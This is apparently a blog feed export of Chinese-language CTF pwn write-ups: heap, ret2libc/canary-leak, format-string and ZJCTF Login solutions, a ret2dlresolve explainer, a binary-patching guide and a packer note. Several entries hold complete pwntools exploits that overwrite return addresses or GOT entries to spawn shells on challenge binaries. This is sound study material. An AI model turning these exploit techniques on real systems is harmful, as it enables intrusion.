=b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload += p64(0) * 2</span><br><span class="line">payload += p64(0x41)</span><br><span class="line"></span><br><span class="line">edit(0,payload)</span><br><span class="line">delete(1)</span><br><span class="line">pause()</span><br><span class="line">#create(0x38,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =b&#x27;a&#x27; * 0x20 + p64(0x38) + p64(free_got)</span><br><span class="line">create(0x38,payload)</span><br><span class="line">show(1)</span><br><span class="line">free_addr = u64(p.recvuntil(&quot;\x7f&quot;)[-6:]+b&#x27;\x00&#x27;*2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(hex(free_addr))</span><br><span class="line">libc_base = free_addr - libc.sym[&#x27;free&#x27;]</span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(system))</span><br><span class="line"></span><br><span class="line">edit(1,p64(system))</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn-堆学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>武功山杯pwn复现</title>
      <link href="/posts/4128.html"/>
      <url>/posts/4128.html</url>
      
        <content type="html"><![CDATA[<h1 id="穿云入雾"><a href="#穿云入雾" class="headerlink" title="穿云入雾"></a>穿云入雾</h1><p>这题nc连接后输入WuGongShan_i_Come</p><h1 id="安源路矿"><a href="#安源路矿" class="headerlink" title="安源路矿"></a>安源路矿</h1><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111947299.png" alt="1"></p><p>canary保护和NX保护</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111947673.png" alt="2"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111947674.png" alt="3"></p><p>利用上面这个函数溢出一个泄露canary 还可以泄露在这里的rbp</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111947675.png" alt="4"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111947676.png" alt="5"></p><p>这里泄露出来了</p><h2 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h2><p>然后当我想正常走ret2libc的流程的时候发现在连接后会出现超时的情况</p><p>这个时候，在高人指点下（赛后）发现可以利用一种类似于栈迁移的方法，就是利用上面泄露的rbp将函数puts完后回到puts这里，puts出puts的got表，之后在进行one_gadget(ret2libc超时)</p><p>但是要注意这里的rbp有变化</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111947675.png" alt="4"></p><p>read到puts rbp-0x50</p><p>最后exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;59.62.61.30&#x27;, 48603)</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400853</span></span><br><span class="line">ret=<span class="number">0x40028b</span></span><br><span class="line">addr=<span class="number">0x4007af</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x46</span>+<span class="string">b&#x27;bbb&#x27;</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">rbp_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;rbp&#x27;</span>+<span class="built_in">hex</span>(rbp_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(canary)</span><br><span class="line">payload2+=p64(rbp_addr-<span class="number">0x50</span>)</span><br><span class="line">payload2+=p64(pop_rdi)</span><br><span class="line">payload2+=p64(puts_got)</span><br><span class="line">payload2+=p64(addr)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;overflow!&#x27;</span>,payload2)</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;overflow!&#x27;)</span></span><br><span class="line">p.recv()</span><br><span class="line">leak_addr= u64(p.recvline(<span class="number">6</span>).strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">one=<span class="number">0x4f3d5</span></span><br><span class="line">libc_base=leak_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gadgets=libc_base+one</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc_base=leak_addr-libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">bin_sh_addr=libc_base+next(libc.search(b&#x27;bin/sh&#x27;))</span></span><br><span class="line"><span class="string">system_addr=libc_base+libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(canary)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(gadgets)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload+=p64(ret)</span></span><br><span class="line"><span class="string">payload+=p64(pop_rdi)</span></span><br><span class="line"><span class="string">payload+=p64(bin_sh_addr)+p64(system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-比赛复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2024暑期挑战赛</title>
      <link href="/posts/17833.html"/>
      <url>/posts/17833.html</url>
      
        <content type="html"><![CDATA[<h1 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h1><h2 id="本地环境调试"><a href="#本地环境调试" class="headerlink" title="本地环境调试"></a>本地环境调试</h2><p>之前一直不理解为什么有的题目会给几个文件，现在才知道可以用来方便协调本地和远程的环境的</p><blockquote><p>这里需要使用patchelf这个工具</p><p>修改ld</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ./ld.so ./pwn(路径和文件)</span><br></pre></td></tr></table></figure><p>ld.so 是要修改的 .&#x2F;pwn是本地文件名</p><p>修改libc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn</span><br></pre></td></tr></table></figure></blockquote><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>检查</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111953671.png" alt="1"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111953672.png" alt="2"></p><p>可以看出非栈上格式化字符串漏洞</p><p>来到printf函数</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111953673.png" alt="3"></p><p>可以看到</p><p>1处可以泄露libc 同时也是返回地址的所在地</p><p>两个2处可以利用这样的链式关系修改任意位置的地址</p><p>具体的手搓格式化字符串点这里<a href="https://yufeiyu33.github.io/2024/06/09/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串 | 鱼非愚 (yufeiyu33.github.io)</a></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">s       = lambda data               :p.send(str(data))</span><br><span class="line">sa      = lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = lambda data               :p.sendline(str(data))</span><br><span class="line">sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = lambda num                :p.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = lambda                    :p.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">leak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">l64     = lambda      :u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">l32     = lambda      :u32(p.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&quot;\x00&quot;))</span><br><span class="line">#context.terminal = [&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p=remote(&#x27;node5.buuoj.cn&#x27;,25630)</span><br><span class="line">p=process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">def duan():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">ru(&#x27;Please enter a keyword\n&#x27;)</span><br><span class="line">#duan()</span><br><span class="line">sl(&#x27;%9$p-%11$p&#x27;)</span><br><span class="line">ru(&#x27;0x&#x27;)</span><br><span class="line">libc_leak=int(r(12),16)</span><br><span class="line">libc_base=libc_leak-libc.sym[&#x27;__libc_start_main&#x27;]-240#remote 240</span><br><span class="line">leak(&#x27;libc_leak&#x27;,libc_leak)</span><br><span class="line">leak(&#x27;libc_base &#x27;,libc_base)</span><br><span class="line"></span><br><span class="line">ru(&#x27;-0x&#x27;)</span><br><span class="line">stack=int(r(12),16)</span><br><span class="line">leak(&#x27;stack &#x27;,stack)</span><br><span class="line">stack1=stack-224</span><br><span class="line">leak(&#x27;stack1 &#x27;,stack1)</span><br><span class="line">leak(&#x27;stack1&amp;0xffff &#x27;,stack1&amp;0xffff)</span><br><span class="line">ogs=[0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">og=libc_base+ogs[0]</span><br><span class="line">leak(&#x27;og&#x27;,og)</span><br><span class="line"></span><br><span class="line">leak(&#x27;og&amp;0xffff&#x27;,og&amp;0xffff)</span><br><span class="line">leak(&#x27;(og&gt;&gt;16)&amp;0xff&#x27;,(og&gt;&gt;16)&amp;0xff)</span><br><span class="line">duan()</span><br><span class="line">sla(&#x27;Please enter a keyword&#x27;,&#x27;%&#x27;+str(stack1&amp;0xffff)+&#x27;c%11$hn&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sla(&#x27;Please enter a keyword&#x27;,&#x27;%&#x27;+str(og&amp;0xffff)+&#x27;c%37$hn&#x27;)</span><br><span class="line">sla(&#x27;Please enter a keyword&#x27;,&#x27;%&#x27;+str((stack1+2)&amp;0xffff)+&#x27;c%11$hn&#x27;)</span><br><span class="line">sla(&#x27;Please enter a keyword&#x27;,&#x27;%&#x27;+str((og&gt;&gt;16)&amp;0xff)+&#x27;c%37$hhn&#x27;)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">sla(&#x27;Please enter a keyword&#x27;,&#x27;%&#x27;+str(stack1&amp;0xffff)+&#x27;c%11$hn&#x27;)</span><br><span class="line">sla(&#x27;Please enter a keyword&#x27;,&#x27;%&#x27;+str(og&amp;0xffff)+&#x27;c%37$hn&#x27;)</span><br><span class="line">sla(&#x27;Please enter a keyword&#x27;,&#x27;%&#x27;+str((stack1+2)&amp;0xffff)+&#x27;c%11$hn&#x27;)</span><br><span class="line">sla(&#x27;Please enter a keyword&#x27;,&#x27;%&#x27;+str((og&gt;&gt;16)&amp;0xff)+&#x27;c%37$hhn&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-比赛复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[ZJCTF 2019]Login题解</title>
      <link href="/posts/11735.html"/>
      <url>/posts/11735.html</url>
      
        <content type="html"><![CDATA[<p>这个题目主要考察了函数间的参数的的具体分析</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003196.png" alt="1"></p><p>先检查保护，有canary保护</p><p>在ida中静态分析一下</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003197.png" alt="2"></p><p>有个账号密码的输入和检查，漏洞一般就是在账号密码输入的地方</p><p>先运行看看什么情况</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003198.png" alt="4"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003199.png" alt="5"></p><p>发现只要输入对了密码，就会出现这样的异常，在ida查看这个异常的函数</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003200.png" alt="6"></p><p>发现只要输入对了密码就会跳转到上面的函数</p><p>所以要来找找a1的来源</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003201.png" alt="7"></p><p>rax就是a1 </p><p>也就是外面的&amp;v7</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003202.png" alt="12"></p><p>点开<img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003203.png" alt="8"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003204.png" alt="9"></p><p>发现v7是rbp+var_18</p><p>rbp&#x3D;rsp</p><p>在下面输入函数中</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003205.png" alt="10"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003207.png" alt="11"></p><p>同样rbp&#x3D;rsp</p><p>这两个函数见rsp的值是没有发生变化的</p><p>故可在密码处通过覆盖得到改变a1</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003208.png" alt="13"></p><p>计算偏移即可</p><p>0x60-0xf(2jctf_pa5sw0rd)-0x18&#x3D;58</p><p>后面就是a1覆盖上bookdoor<img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112003209.png" alt="14"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29903</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bookdoor=<span class="number">0x400e88</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;123&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;2jctf_pa5sw0rd&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">58</span>+p64(bookdoor)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;username:&#x27;</span>,payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;password:&#x27;</span>,payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn-刷题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2dlresolve及例题</title>
      <link href="/posts/42031.html"/>
      <url>/posts/42031.html</url>
      
        <content type="html"><![CDATA[<h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>ret2dlresolve主要是利用函数进行plt表进行动态链接的时候，通过一系列的跳转才能找到got表，就是利用的这个过程进行漏洞攻击</p><h2 id="dl-runtime-resolve函数调用"><a href="#dl-runtime-resolve函数调用" class="headerlink" title="_dl_runtime_resolve函数调用"></a>_dl_runtime_resolve函数调用</h2><p>参考：[<a href="https://bbs.kanxue.com/thread-250703.htm">原创]ROP高级用法之ret2_dl_runtime_resolve-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p><blockquote><ol><li>首先用link_map访问.dynamic，分别取出.dynstr、 .dynsym、 .rel.plt的地址</li><li>.dynamic的地址加0x44的位置是.dynstr<br>.dynamic的地址加0x4c的位置是.dynsym<br>.dynamic的地址加0x84的位置是.rel.plt</li><li>.rel.plt + 参数reloc_index,求出当前函数的重定位表项Elf32_Rel的指针，记作rel</li><li>rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym</li><li>.dynstr + sym-&gt;st_name得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表</li><li>最后调用这个函数</li></ol></blockquote><p>下面是XDCTF 2015 pwn200 </p><p>源码：<a href="https://www.yuque.com/hxfqg9/bin/erh0l7">Advanced ROP (yuque.com)</a></p><p>现在通过strlen函数来演示这个过程</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000388.png" alt="1"></p><p>首先，进入这个函数</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000389.png" alt="2"></p><p>看到那两个push，取得以下的值</p><blockquote><p> reloc_index&#x3D;0x18</p><p>link_map&#x3D;0x804b220</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000390.png" alt="3"></p><p>通过link_map里面的函数继续进行寻找</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000391.png" alt="4"></p><p>第三个地址就是.dynamic</p><blockquote><p>.dynamic&#x3D;0x0804b128</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000392.png" alt="5"></p><p>.dynamic的地址加0x44的位置是.dynstr<br>.dynamic的地址加0x4c的位置是.dynsym<br>.dynamic的地址加0x84的位置是.rel.plt</p><blockquote><p>.dynstr:0x080482c8</p><p>.dynsym:0x08048228</p><p>.rel.plt:0x0804839c</p></blockquote><blockquote><p>rel(Elf32_Rel的指针)&#x3D;.rel.plt+reloc_index</p><p>rel&#x3D;0x18+0x0804839c&#x3D;0x080483b4</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000393.png" alt="6"></p><blockquote><p>r_offset&#x3D;0x0804b234</p><p>r_info&#x3D;0x00000507</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000394.png" alt="7"></p><p>接着r_info&gt;&gt;8 &#x3D;5作为下标，来到.dynsym的位置</p><blockquote><p>找到0x0000001a</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000395.png" alt="8"></p><p>最后在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表就可以了</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote><p>利用改变最后那个地址的函数的名字岂不是可以随意调用函数了</p></blockquote><h3 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h3><blockquote><p>而index_arg即参数n是我们可以控制的，我们需要做的是通过一系列操作。把index_arg可控转化为st_name可控;我们需要在一个可写地址上构造一系列伪结构就可以完成利用或在条件允许的情况下直接修改.dynstr<br>所以我们需要在程序中找一段空间start出来，放我们直接构造的fake_dynsym,fake_dynstr和fake_rel_plt等，然后利用栈迁移的手法将栈转移到start</p></blockquote><h3 id="下面演示这道题的做法（用ret2dlresolve）"><a href="#下面演示这道题的做法（用ret2dlresolve）" class="headerlink" title="下面演示这道题的做法（用ret2dlresolve）"></a>下面演示这道题的做法（用ret2dlresolve）</h3>]]></content>
      
      
      <categories>
          
          <category> pwn-栈学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn漏洞修复</title>
      <link href="/posts/28250.html"/>
      <url>/posts/28250.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-patch"><a href="#pwn-patch" class="headerlink" title="pwn patch"></a>pwn patch</h1><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h3 id="read-32"><a href="#read-32" class="headerlink" title="read 32"></a>read 32</h3><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000008.png" alt="1"></p><p>在push 18h处右击 点击Assemble 将18h改成正常的无溢出的长度就好了</p><h3 id="read-64"><a href="#read-64" class="headerlink" title="read 64"></a>read 64</h3><p>64位的也是同理</p><p>找到溢出的函数将长度改合理</p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="32"><a href="#32" class="headerlink" title="32"></a>32</h3><p>法一 ：若有puts的plt把printf改成puts即可</p><p>法二：需要改一个函数无用的函数改成write函数</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:080485C0 win             proc near</span><br><span class="line">.text:080485C0 ; __unwind &#123;</span><br><span class="line">.text:080485C0                 push    20h ; &#x27; &#x27;       ; n</span><br><span class="line">.text:080485C2                 push    eax             ; buf</span><br><span class="line">.text:080485C3                 push    1               ; fd</span><br><span class="line">.text:080485C5                 call    _write</span><br><span class="line">.text:080485CA                 pop     eax</span><br><span class="line">.text:080485CB                 pop     eax</span><br><span class="line">.text:080485CC                 jmp     loc_8048651</span><br><span class="line">.text:080485CC win             endp</span><br></pre></td></tr></table></figure><p>法三：找到一个地方，修改成%s</p><p>在找一个地方把之前给讲</p><h2 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h2><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000009.png" alt="2"></p><p>找到Physical address对应的字段区域，把flag 那里的值改成相应的值就可以了</p><blockquote><p>4 只读</p><p>5 可读可执行</p><p>6 可读可写</p><p>7 可读可写可执行</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> pwn-学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse-壳与脱壳</title>
      <link href="/posts/8764.html"/>
      <url>/posts/8764.html</url>
      
        <content type="html"><![CDATA[<h1 id="壳"><a href="#壳" class="headerlink" title="壳"></a>壳</h1><p>壳分为两类</p><p>压缩壳：</p><blockquote><p>UPX  ASPack  PECompact  RLPack NSPack</p></blockquote><p>保护壳、</p><blockquote><p>ASProtect  Armadillo EXECryptor Themida</p></blockquote><h2 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h2><p>参考这篇<a href="https://blog.csdn.net/m0_68259687/article/details/130902652?spm=1001.2014.3001.5506">【BUUCTF】 reverse 新年快乐_buuctf 文件加壳和脱壳-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> reverse-学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串</title>
      <link href="/posts/44702.html"/>
      <url>/posts/44702.html</url>
      
